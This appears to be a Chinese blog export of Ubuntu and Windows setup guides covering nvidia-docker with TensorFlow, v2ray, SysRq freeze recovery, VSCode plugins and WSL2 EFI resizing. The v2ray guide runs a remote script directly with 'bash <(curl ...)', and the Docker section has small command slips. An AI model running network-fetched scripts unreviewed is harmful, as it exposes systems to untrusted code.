<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ apt-cache madison docker-ce</span><br><span class="line"></span><br><span class="line">  docker-ce | 5:18.09.1~3-0~ubuntu-xenial | https://download.docker.com/linux/ubuntu  xenial/stable amd64 Packages</span><br><span class="line">  docker-ce | 5:18.09.0~3-0~ubuntu-xenial | https://download.docker.com/linux/ubuntu  xenial/stable amd64 Packages</span><br><span class="line">  docker-ce | 18.06.1~ce~3-0~ubuntu       | https://download.docker.com/linux/ubuntu  xenial/stable amd64 Packages</span><br><span class="line">  docker-ce | 18.06.0~ce~3-0~ubuntu       | https://download.docker.com/linux/ubuntu  xenial/stable amd64 Packages</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用第二列中的版本字符串安装特定版本，例如<code>5:18.09.1~3-0~ubuntu-xenial</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install docker-ce=&lt;VERSION_STRING&gt; docker-ce-cli=&lt;VERSION_STRING&gt; containerd.io</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-通过运行hello-world-映像来验证是否正确安装了Docker-Engine-Community-。"><a href="#4-通过运行hello-world-映像来验证是否正确安装了Docker-Engine-Community-。" class="headerlink" title="4. 通过运行hello-world 映像来验证是否正确安装了Docker Engine-Community 。"></a>4. 通过运行hello-world 映像来验证是否正确安装了Docker Engine-Community 。</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo docker run hello-world</span><br></pre></td></tr></table></figure>
<p>此命令下载测试镜像并在容器中运行。容器运行时，它会打印参考消息并退出。</p>
<blockquote>
<p>参考：<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></p>
</blockquote>
<h1 id="三、nvidia-docker和nvidia-container-runtime安装和配置"><a href="#三、nvidia-docker和nvidia-container-runtime安装和配置" class="headerlink" title="三、nvidia-docker和nvidia-container-runtime安装和配置"></a>三、<code>nvidia-docker</code>和<code>nvidia-container-runtime</code>安装和配置</h1><h2 id="1-安装nvidia-docker-。"><a href="#1-安装nvidia-docker-。" class="headerlink" title="1. 安装nvidia-docker 。"></a>1. 安装<code>nvidia-docker</code> 。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Add the package repositories</span><br><span class="line">$ distribution=$(. /etc/os-release;echo $ID$VERSION_ID)</span><br><span class="line">$ curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -</span><br><span class="line">$ curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list</span><br><span class="line"></span><br><span class="line">$ sudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkit</span><br><span class="line">$ sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h2 id="2-安装nvidia-container-runtime"><a href="#2-安装nvidia-container-runtime" class="headerlink" title="2. 安装nvidia-container-runtime"></a>2. 安装nvidia-container-runtime</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install nvidia-container-runtime</span><br></pre></td></tr></table></figure>

<h2 id="3-Docker引擎配置"><a href="#3-Docker引擎配置" class="headerlink" title="3. Docker引擎配置"></a>3. Docker引擎配置</h2><h3 id="1-Systemd-drop-in-file"><a href="#1-Systemd-drop-in-file" class="headerlink" title="1. Systemd drop-in file"></a>1. Systemd drop-in file</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line">sudo tee /etc/systemd/system/docker.service.d/override.conf &lt;&lt;EOF</span><br><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=/usr/bin/dockerd --host=fd:// --add-runtime=nvidia=/usr/bin/nvidia-container-runtime</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="2-Daemon-configuration-file"><a href="#2-Daemon-configuration-file" class="headerlink" title="2. Daemon configuration file"></a>2. Daemon configuration file</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;EOF</span><br><span class="line">&#123;</span><br><span class="line">    &quot;runtimes&quot;: &#123;</span><br><span class="line">        &quot;nvidia&quot;: &#123;</span><br><span class="line">            &quot;path&quot;: &quot;/usr/bin/nvidia-container-runtime&quot;,</span><br><span class="line">            &quot;runtimeArgs&quot;: []</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo pkill -SIGHUP dockerd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考：</p>
<p><a href="https://github.com/NVIDIA/nvidia-docker">https://github.com/NVIDIA/nvidia-docker</a></p>
<p><a href="https://github.com/nvidia/nvidia-container-runtime">https://github.com/nvidia/nvidia-container-runtime</a></p>
</blockquote>
<h1 id="四、配置tensorflow"><a href="#四、配置tensorflow" class="headerlink" title="四、配置tensorflow"></a>四、配置tensorflow</h1><h2 id="1-验证-nvidia-docker-安装"><a href="#1-验证-nvidia-docker-安装" class="headerlink" title="1. 验证 nvidia-docker 安装"></a>1. 验证 nvidia-docker 安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo docker run --runtime=nvidia --rm nvidia/cuda nvidia-smi</span><br></pre></td></tr></table></figure>
<img src="/2019/11/09/Ubuntu-18-4%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AETensorFlow-GPU%E7%8E%AF%E5%A2%83/2019-11-09-17-34-09.png" class="">

<h2 id="2-下载并运行支持-GPU-的-TensorFlow-映像"><a href="#2-下载并运行支持-GPU-的-TensorFlow-映像" class="headerlink" title="2. 下载并运行支持 GPU 的 TensorFlow 映像"></a>2. 下载并运行支持 <code>GPU</code> 的 <code>TensorFlow</code> 映像</h2><h3 id="1-下载支持-GPU-的-TensorFlow-映像"><a href="#1-下载支持-GPU-的-TensorFlow-映像" class="headerlink" title="1. 下载支持 GPU 的 TensorFlow 映像"></a>1. 下载支持 <code>GPU</code> 的 <code>TensorFlow</code> 映像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo docker run --runtime=nvidia -it --rm tensorflow/tensorflow:latest-gpu</span><br></pre></td></tr></table></figure>
<img src="/2019/11/09/Ubuntu-18-4%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AETensorFlow-GPU%E7%8E%AF%E5%A2%83/2019-11-09-17-37-14.png" class="">

<h3 id="2-环境测试"><a href="#2-环境测试" class="headerlink" title="2. 环境测试"></a>2. 环境测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import tensorflow as tf;print(tf.reduce_sum(tf.random.normal([1000, 1000])))&quot;</span><br></pre></td></tr></table></figure>
<img src="/2019/11/09/Ubuntu-18-4%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AETensorFlow-GPU%E7%8E%AF%E5%A2%83/2019-11-09-17-39-56.png" class="">

<h3 id="3-使用最新的-TensorFlow-GPU-映像在容器中启动-bash-shell-会话"><a href="#3-使用最新的-TensorFlow-GPU-映像在容器中启动-bash-shell-会话" class="headerlink" title="3. 使用最新的 TensorFlow GPU 映像在容器中启动 bash shell 会话"></a>3. 使用最新的 TensorFlow GPU 映像在容器中启动 bash shell 会话</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo docker run --runtime=nvidia -it tensorflow/tensorflow:latest-gpu bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考：<a href="https://www.tensorflow.org/install/docker">https://www.tensorflow.org/install/docker</a></p>
</blockquote>
<h1 id="五、通过软链接修改Docker配置本地镜像与容器的存储位置"><a href="#五、通过软链接修改Docker配置本地镜像与容器的存储位置" class="headerlink" title="五、通过软链接修改Docker配置本地镜像与容器的存储位置"></a>五、通过软链接修改Docker配置本地镜像与容器的存储位置</h1><p>默认情况下Docker的存放位置为：<code>/var/lib/docker</code> ,由于我的系统分区比较小，需要修改Docker配置本地镜像与容器的存储位置。</p>
<p>可以通过下面命令查看具体位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo docker info | grep &quot;Docker Root Dir&quot;</span><br></pre></td></tr></table></figure>
<p>解决这个问题，最直接的方法当然是挂载分区到这个目录，但是我的数据盘还有其他东西，这肯定不好管理，所以采用修改镜像和容器的存放路径的方式达到目的。</p>
<p>这个方法里将通过软连接来实现。</p>
<p>首先停掉Docker服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl restart docker</span><br><span class="line">或者</span><br><span class="line">$ sudo service docker stop</span><br></pre></td></tr></table></figure>

<p>然后移动整个&#x2F;var&#x2F;lib&#x2F;docker目录到目的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo sudo mv /var/lib/docker /root/data/docker</span><br><span class="line">$ sudo ln -s /root/data/docker /var/lib/docker</span><br></pre></td></tr></table></figure>
<p>这时候启动Docker时发现存储目录依旧是&#x2F;var&#x2F;lib&#x2F;docker，但是实际上是存储在数据盘的，你可以在数据盘上看到容量变化。</p>
<h1 id="六、使用非root用户运行docker"><a href="#六、使用非root用户运行docker" class="headerlink" title="六、使用非root用户运行docker"></a>六、使用非root用户运行docker</h1><p>默认情况下，docker 命令会使用 Unix socket 与 Docker 主机通讯，安装完docker主机后默认会创建一个docke用户组。而只有 root 用户和 docker 组的用户才可以访问 Docker 主机的 Unix socket，所以需要把linux非root用户添加到docker组才能直接访问docker 主机。步骤如下：</p>
<ol>
<li><p>如果没有创建docker用户组，则需要先创建一个docket用户组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo groupadd docker</span><br></pre></td></tr></table></figure>
</li>
<li><p>将指定的用户添加到docker用户组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo usermod -aG docker userName</span><br></pre></td></tr></table></figure></li>
<li><p>重启docker服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo service docker restart //或者 </span><br><span class="line">$ sudo /etc/init.d/docker restart</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后注销重登陆使用户组生效，或者使用以下命令直接登陆到docker组中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ newgrp - docker //切换到docker用户组</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参考：<a href="https://blog.csdn.net/wenwenxiong/article/details/78728696">https://blog.csdn.net/wenwenxiong/article/details/78728696</a></p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>TensorFlow</category>
      </categories>
      <tags>
        <tag>Ubuntu Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu下安装使用v2ray</title>
    <url>/2019/11/04/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8v2ray/</url>
    <content><![CDATA[<blockquote>
<p>文章转载自：<a href="https://deng55.github.io/2017/12/04/Ubuntu%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8V2ray/">https://deng55.github.io/2017/12/04/Ubuntu%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8V2ray/</a></p>
<p><a href="https://www.imcaviare.com/2018-12-18-1/">https://www.imcaviare.com/2018-12-18-1/</a></p>
</blockquote>
<!-- TOC -->

<ul>
<li><a href="#1%E5%AE%89%E8%A3%85v2ray">1.安装v2ray</a></li>
<li><a href="#2%E9%85%8D%E7%BD%AE">2.配置</a><ul>
<li><a href="#1-%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1">1. 启动服务</a></li>
</ul>
</li>
<li><a href="#3-%E9%85%8D%E7%BD%AEpac">3. 配置PAC</a></li>
</ul>
<!-- /TOC -->
<p>由于最近把系统换成了ubuntu，虽然已经用上了shadowsocks-qt5，但是本着折腾的态度，还是想把v2ray部署起来。</p>
<h1 id="1-安装v2ray"><a href="#1-安装v2ray" class="headerlink" title="1.安装v2ray"></a>1.安装v2ray</h1><p>安装的过程比较简单，可直接按照官方教程。</p>
<p>ubuntu系统下使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br></pre></td></tr></table></figure>

<p>命令执行完之后，会自动生成如下文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/v2ray/v2ray：V2Ray 程序；</span><br><span class="line">/etc/v2ray/config.json：配置文件；</span><br></pre></td></tr></table></figure>

<h1 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h1><p>找了很多教程，在配置这一块都比较模糊，特别是linux环境下的配置。</p>
<p>很多教程说是去下载官方的<code>v2ray-core</code>包，之后的步骤就没详细说了，我也在这一块浪费了很多时间，部署起来后才知道确实是自己想复杂了</p>
<p>还记得我们第一步的安装过程吗，安装成功后会生成<code>/etc/v2ray/config.json</code>文件，其实在ubuntu系统下这个文件不需要，因为本身是当做客户端来使用的，这时候去看下载的核心包</p>
<p>下载核心包后，解压出来会有一些配置文件，核心包里面我们需要的文件是：<code>vpoint_socks_vmess.json</code> ，这个文件才是最终要使用的配置文件，把这个文件改名为<code>config.json</code>，并替换第一步安装的<code>/etc/v2ray/config.json</code></p>
<p>vpoint_socks_vmess.json文件截图如下：</p>
<img src="/2019/11/04/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8v2ray/UbuntuUseV2ray.png" class="">

<p>这就和windows下的配置是一样的了。</p>
<p>上面截图我有一块注释掉了，主要是不太了解这里的配置，不注释跑不起来</p>
<p>其实可以用偷懒的方法，如果之前在windows下部署过了，直接把config.json文件拿过来，放到<code>/etc/v2ray</code>目录下即可（删除该目录下原有的配置文件）</p>
<h2 id="1-启动服务"><a href="#1-启动服务" class="headerlink" title="1. 启动服务"></a>1. 启动服务</h2><p>文件替换之后，就可以使用<code>service v2ray start</code>来启动 V2Ray 进程，chrome下配合SwitchyOmega扩展来使用，剩下的应该都会了。</p>
<p>使用以下命令启动 V2Ray:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start v2ray</span><br></pre></td></tr></table></figure>
<p>停止运行 V2Ray：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop v2ray</span><br></pre></td></tr></table></figure>
<p>重启 V2Ray:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart v2ray</span><br></pre></td></tr></table></figure>
<p>其他的命令可以参考官方文档，以上就是ubuntu下使用的办法了。</p>
<h1 id="3-配置PAC"><a href="#3-配置PAC" class="headerlink" title="3. 配置PAC"></a>3. 配置PAC</h1><p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pip install genpac</span><br><span class="line"></span><br><span class="line"># 从gfwlist生成代理信息为SOCKS5 127.0.0.1:1080的PAC文件</span><br><span class="line">genpac --format=pac --pac-proxy=&quot;SOCKS5 127.0.0.1:1080&quot; -o /etc/v2ray/autoproxy.pac</span><br></pre></td></tr></table></figure>
<p>为避免不必要的bug请注意以下两点：</p>
<ul>
<li>文件有足够的读写权限</li>
<li>配置URL以file:&#x2F;&#x2F;开头电脑根目录为起始。</li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu死机解决方法汇总</title>
    <url>/2019/11/08/Ubuntu%E6%AD%BB%E6%9C%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<blockquote>
<p>转载自 : <a href="https://blog.csdn.net/frogoscar/article/details/64921708">https://blog.csdn.net/frogoscar/article/details/64921708</a></p>
</blockquote>
<!-- TOC -->

<ul>
<li><a href="#1-%E8%BF%9B%E5%85%A5tty%E7%BB%88%E7%AB%AF">1. 进入TTY终端</a></li>
<li><a href="#2-%E7%9B%B4%E6%8E%A5%E6%B3%A8%E9%94%80%E7%94%A8%E6%88%B7">2. 直接注销用户</a></li>
<li><a href="#3-%E5%BA%95%E5%B1%82%E6%96%B9%E6%B3%95">3. 底层方法</a></li>
</ul>
<!-- /TOC -->
<p>可尝试的解决方法</p>
<h1 id="1-进入TTY终端"><a href="#1-进入TTY终端" class="headerlink" title="1. 进入TTY终端"></a>1. 进入TTY终端</h1><p><code>Ctrl+Alt+F1</code>进入<code>TTY1</code>终端字符界面, 输入用户名和密码以登录。</p>
<p>输入<code>top</code>命令, 找到可能造成假死的进程, 用<code>kill</code>命令结束掉进程。然后<code>Ctrl+Alt+F7</code>回到桌面。</p>
<h1 id="2-直接注销用户"><a href="#2-直接注销用户" class="headerlink" title="2. 直接注销用户"></a>2. 直接注销用户</h1><p><code>Ctrl+Alt+F1</code>进入<code>TTY1</code>终端字符界面, 输入用户名和密码以登录。</p>
<p>然后执行以下的任意一个命令注销桌面重新登录。</p>
<p><code>sudo pkill Xorg</code>或者<code>sudo restart lightdm</code> 。</p>
<h1 id="3-底层方法"><a href="#3-底层方法" class="headerlink" title="3. 底层方法"></a>3. 底层方法</h1><p>如果上面两种方法不成功, 那有可能是比较底层的软件出现问题。</p>
<p>可以试试 : <code>reisub</code> 方法。</p>
<p>说具体一点, 是一种系统请求, 直接交给内核处理。</p>
<p>键盘上一般都有一个键<code>SysRq</code>, 和<code>PrintScreen</code>(截屏)在一个键位上，这就是系统请求的键。</p>
<p>这个方法可以在死机的情况下安全地重启计算机, 数据不会丢失。</p>
<p>下面解释一下这个方法：</p>
<p>其实 <code>SysRq</code>是一种叫做系统请求的东西, 按住 <code>Alt-Print</code> 的时候就相当于按住了<code>SysRq</code>键，这个时候输入的一切都会直接由 <code>Linux</code> 内核来处理，它可以进行许多低级操作。</p>
<p>这个时候 <code>reisub</code> 中的每一个字母都是一个独立操作，分别表示：</p>
<p><code>r</code> : <code>unRaw</code> 将键盘控制从 <code>X Server</code> 那里抢回来。</p>
<p><code>e</code> : <code>tErminate</code> 给所有进程发送 <code>SIGTERM</code> 信号，让它们自己解决善后</p>
<p><code>i</code> : <code>kIll</code> 给所有进程发送 <code>SIGKILL</code> 信号，强制他们马上关闭</p>
<p><code>s</code> : <code>Sync</code> 将所有数据同步至磁盘</p>
<p><code>u</code> : <code>Unmount</code> 将所有分区挂载为只读模式</p>
<p><code>b</code> : <code>reBoo</code>t 重启</p>
<p>魔法键组合 <code>reisub</code> 究竟该怎么用？<br>如果某一天你的 <code>Linux</code> 死机了，键盘不听使唤了，<code>Ctrl+Alt+F1</code> 已经没有任何反应，该怎么办呢？</p>
<p>使用“魔法键”：<code>Alt+SysRq + r,e,i,s,u,b</code>（确实很好背，就是单词 <code>busier</code> (英语”更忙”的意思)的倒写）。</p>
<p>好的，平时电脑那么正常，你自然也不会去按这些按钮。等到真的出事的时候，你把记在小纸条上的这些 tips 拿出来，然后在键盘上按，结果发现啥反应也没有，于是只能欲哭无泪了。</p>
<p>问题在于：究竟该怎么按这些按钮才会有效？<br>首先，你的系统要支持这个功能，查看和开启的方法大家应该很熟悉了，网上也有很多说明，而且最幸运的是：Ubuntu 默认已经开启了这个功能。</p>
<p>接下来就是操作：马上你就会发现，同时按下<code>&lt;Alt&gt;+&lt;SysRq&gt;</code>压根儿行不通！只会蹦出来一个屏幕截图窗口。所以，真正的做法应该是：</p>
<p>伸出你的左手，同时按住<code>&lt;Ctrl&gt;+&lt;Alt&gt;</code>键，别松开<br>右手先按一下<code>&lt;SysRq&gt;</code>，左手别松开，等1秒<br>右手按一下 <code>R</code>，左手别松开，等1秒<br>右手按一下 <code>E</code>，左手别松开。这时包括桌面在内，所有程序都会终止，你会看到一个黑乎乎的屏幕，稍微等一段时间<br>右手依次按下 <code>I，S，U，B</code>，左手别松开。每按一次都等那么几秒种，你会发现每按一次，屏幕上信息都会有所变化。最后按下<code>B</code>时，屏幕显示<code>reset</code>，这时你的左手可以松开了，等几秒钟，计算机就会安全重启。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode插件</title>
    <url>/2019/11/13/VSCode%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="记录以下自己常用的-VSCode-插件"><a href="#记录以下自己常用的-VSCode-插件" class="headerlink" title="记录以下自己常用的 VSCode 插件"></a>记录以下自己常用的 VSCode 插件</h1><ul>
<li><a href="https://marketplace.visualstudio.com/items?itemName=dan-c-underwood.arm">Arm Assembly</a> - ARM 汇编语法高亮。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=RalfZhang.filetemplate">File Template</a> - 一个自动生成文件模板的 ode 扩展。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=jebbs.markdown-extended">Markdown Extended</a> - markdown 扩展。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=huntertran.auto-markdown-toc">Markdown TOC</a> - 自动生成 toc 。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=mushan.vscode-paste-image">Paste Image</a> - 将图像直接从剪贴板粘贴到 kdown&#x2F;asciidoc 。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=LoyieKing.smalise">Smalise</a> : smali 语法高亮插件。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=TabNine.tabnine-vscode">TabNine</a> : AI 代码神器。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=vscode-icons-team.vscode-icons">vscode-icons</a> : - Icons for ual Studio Code。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=infosec-intern.yara">YARA</a> - yara 语法高亮。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=kiteco.kite">kite</a> - AI 代码神奇。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=cschlosser.doxdocgen">Doxygen Documentation Generator</a> - ygen 文档注释生成。</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=rsbondi.highlight-words">highlight-words</a> - 选中高亮</li>
</ul>
<h1 id="修改-terminal-默认为-cmder"><a href="#修改-terminal-默认为-cmder" class="headerlink" title="修改 terminal 默认为 cmder"></a>修改 terminal 默认为 cmder</h1><p>打开终端设置 <code>terminal.integrated.env.windows</code> 配置文件，添加下列配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;terminal.integrated.defaultProfile.windows&quot;</span>: <span class="string">&quot;Cmder&quot;</span>,</span><br><span class="line"><span class="string">&quot;terminal.integrated.profiles.windows&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Cmder&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;path&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;<span class="variable">$&#123;env:windir&#125;</span>\\Sysnative\\cmd.exe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;<span class="variable">$&#123;env:windir&#125;</span>\\System32\\cmd.exe&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;args&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;/k D:\\Downloads\\cmder\\vendor\\init.bat&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;icon&quot;</span>: <span class="string">&quot;terminal-cmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>VSCode 插件</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2折腾记录</title>
    <url>/2020/06/07/WSL2%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>最近看到很多大佬对于wsl2的推崇，于是就想体验一番，将系统升级到2004，下面记录以下折腾过程。</p>
<!-- TOC -->

<ul>
<li><a href="#1-%E7%B3%BB%E7%BB%9F%E5%8D%87%E7%BA%A7">1. 系统升级</a><ul>
<li><a href="#11-%E9%97%AE%E9%A2%98%E6%88%91%E4%BB%AC%E6%97%A0%E6%B3%95%E6%9B%B4%E6%96%B0%E7%B3%BB%E7%BB%9F%E4%BF%9D%E7%95%99%E7%9A%84%E5%88%86%E5%8C%BA">1.1. 问题：我们无法更新系统保留的分区</a></li>
<li><a href="#12-%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95">1.2. 解决办法</a><ul>
<li><a href="#121-%E5%A4%87%E4%BB%BDefi%E5%88%86%E5%8C%BA">1.2.1. 备份EFI分区</a></li>
<li><a href="#122-%E5%88%A0%E9%99%A4efiesp-%E5%88%86%E5%8C%BA">1.2.2. 删除EFI&#x2F;ESP 分区</a></li>
<li><a href="#123-%E6%89%A9%E5%A4%A7-efi-%E5%88%86%E5%8C%BA">1.2.3. 扩大 EFI 分区</a></li>
<li><a href="#124-%E6%96%B0%E5%BB%BAespmsr%E5%88%86%E5%8C%BA">1.2.4. 新建ESP&#x2F;MSR分区</a></li>
<li><a href="#125-%E8%BF%98%E5%8E%9F-efi-%E5%88%86%E5%8C%BA%E9%95%9C%E5%83%8F">1.2.5. 还原 EFI 分区镜像</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#2-%E5%AE%89%E8%A3%85-wsl2">2. 安装 WSL2</a><ul>
<li><a href="#21-%E7%AC%AC%E4%B8%80%E6%AD%A5%E5%90%AF%E7%94%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B3%E5%8F%B0%E5%92%8C-linux-%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD">2.1. 第一步：启用虚拟机平台和 Linux 子系统功能</a></li>
<li><a href="#22-%E5%90%AF%E7%94%A8-wsl2-%E5%B9%B6%E5%AE%89%E8%A3%85-linux-%E5%AD%90%E7%B3%BB%E7%BB%9F">2.2. 启用 WSL2 并安装 linux 子系统</a></li>
<li><a href="#23-%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%89%E8%A3%85%E4%BD%8D%E7%BD%AE">2.3. 自定义安装位置</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->


<h1 id="1-系统升级"><a href="#1-系统升级" class="headerlink" title="1. 系统升级"></a>1. 系统升级</h1><h2 id="1-1-问题：我们无法更新系统保留的分区"><a href="#1-1-问题：我们无法更新系统保留的分区" class="headerlink" title="1.1. 问题：我们无法更新系统保留的分区"></a>1.1. 问题：我们无法更新系统保留的分区</h2><p>首先进行系统升级就出现了问题“我们无法更新系统保留的分区”，对于这个问题，网上很多人给的答案是 MSR(Microsoft Reserved)分区太小的问题，然而实际问题是ESP(EFI System Partition)分区 “EFI系统分区” 太小的原因，微软在这里所提示的系统保留的分区实际上是指“EFI系统分区”。</p>
<h2 id="1-2-解决办法"><a href="#1-2-解决办法" class="headerlink" title="1.2. 解决办法"></a>1.2. 解决办法</h2><p>备份 EFI 系统分区，然后进入PE系统，删除EFI分区和MSR分区，将C盘空间分出500M空间给EFI分区和MSR分区，然后建立ESP&#x2F;MSR分区，将备份的EFI分区还原就可以了。</p>
<p>下面说一下详细步骤：</p>
<h3 id="1-2-1-备份EFI分区"><a href="#1-2-1-备份EFI分区" class="headerlink" title="1.2.1. 备份EFI分区"></a>1.2.1. 备份EFI分区</h3><p>使用 DiskGenius 备份EFI分区，如下图：</p>
<img src="/2020/06/07/WSL2%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020-06-07-10-00-23.png" class="">

<h3 id="1-2-2-删除EFI-x2F-ESP-分区"><a href="#1-2-2-删除EFI-x2F-ESP-分区" class="headerlink" title="1.2.2. 删除EFI&#x2F;ESP 分区"></a>1.2.2. 删除EFI&#x2F;ESP 分区</h3><p>进入PE系统删除 EFI 分区和 ESP 分区，我的电脑中存在一个系统还原的分区，由于我不需要系统还原，就直接删掉了，当然也可以备份，后续再还原。</p>
<img src="/2020/06/07/WSL2%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020-06-07-10-06-59.png" class="">

<h3 id="1-2-3-扩大-EFI-分区"><a href="#1-2-3-扩大-EFI-分区" class="headerlink" title="1.2.3. 扩大 EFI 分区"></a>1.2.3. 扩大 EFI 分区</h3><p>将 C 盘空间分出 500M 给 EFI 分区，如果担心不够，你也可以多分一点。</p>
<img src="/2020/06/07/WSL2%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020-06-07-10-11-18.png" class="">

<h3 id="1-2-4-新建ESP-x2F-MSR分区"><a href="#1-2-4-新建ESP-x2F-MSR分区" class="headerlink" title="1.2.4. 新建ESP&#x2F;MSR分区"></a>1.2.4. 新建ESP&#x2F;MSR分区</h3><p>选择新建ESP&#x2F;MSR分区，后续的选项保持默认就可以，可以看到分区比之前的要大一些了。</p>
<img src="/2020/06/07/WSL2%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020-06-07-10-15-16.png" class="">

<img src="/2020/06/07/WSL2%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020-06-07-10-21-00.png" class="">

<h3 id="1-2-5-还原-EFI-分区镜像"><a href="#1-2-5-还原-EFI-分区镜像" class="headerlink" title="1.2.5. 还原 EFI 分区镜像"></a>1.2.5. 还原 EFI 分区镜像</h3><p>选中 EFI 分区，右键-&gt;从镜像文件还原分区，还原之前保存的 EFI 分区镜像。</p>
<img src="/2020/06/07/WSL2%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020-06-07-10-16-27.png" class="">

